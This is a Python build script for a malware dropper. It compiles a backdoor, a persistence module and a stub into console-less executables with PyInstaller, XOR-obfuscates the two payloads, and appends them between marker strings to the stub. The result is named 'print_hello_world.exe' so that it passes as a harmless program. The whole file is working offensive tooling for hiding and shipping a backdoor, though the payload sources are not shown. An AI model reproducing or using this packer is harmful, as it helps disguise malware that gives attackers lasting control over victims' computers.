import subprocess
import os
import shutil

def build_exe(filename):
    subprocess.run(["pyinstaller", "--onefile", "--noconsole", "--clean", f"{filename}.py"], check=True)
    shutil.move(f"dist/{filename}.exe", f"{filename}.exe")
    shutil.rmtree("dist", ignore_errors=True)
    shutil.rmtree("build", ignore_errors=True)
    os.remove(f"{filename}.spec")
    
def xor(filename, key = 12):
    with open(filename, 'rb') as f: 
        data = f.read()
        xorfile = bytes(val ^ key for val in data)
        with open(f"{filename}.xor", 'wb') as xf:
            xf.write(xorfile)

def combine():
    output_path = "print_hello_world.exe"

    with open("stub.exe", 'rb') as f: 
        stub_data = f.read()
    with open("Backdoor_obfuscated.exe.xor", 'rb') as f: 
        b_data = f.read()
    with open("Persistent_obfuscated.exe.xor", 'rb') as f: 
        p_data = f.read()
    with open(output_path, 'wb') as f: 
        f.write(stub_data)
        f.write(b"<<<BSTART>>>")
        f.write(b_data)
        f.write(b"<<<BEND>>>")
        f.write(b"<<<PSTART>>>")
        f.write(p_data)
        f.write(b"<<<PEND>>>")


if __name__ == "__main__":
    build_exe("Backdoor_obfuscated")
    build_exe("Persistent_obfuscated")
    build_exe("stub")
    xor("Backdoor_obfuscated.exe")
    xor("Persistent_obfuscated.exe")
    combine()



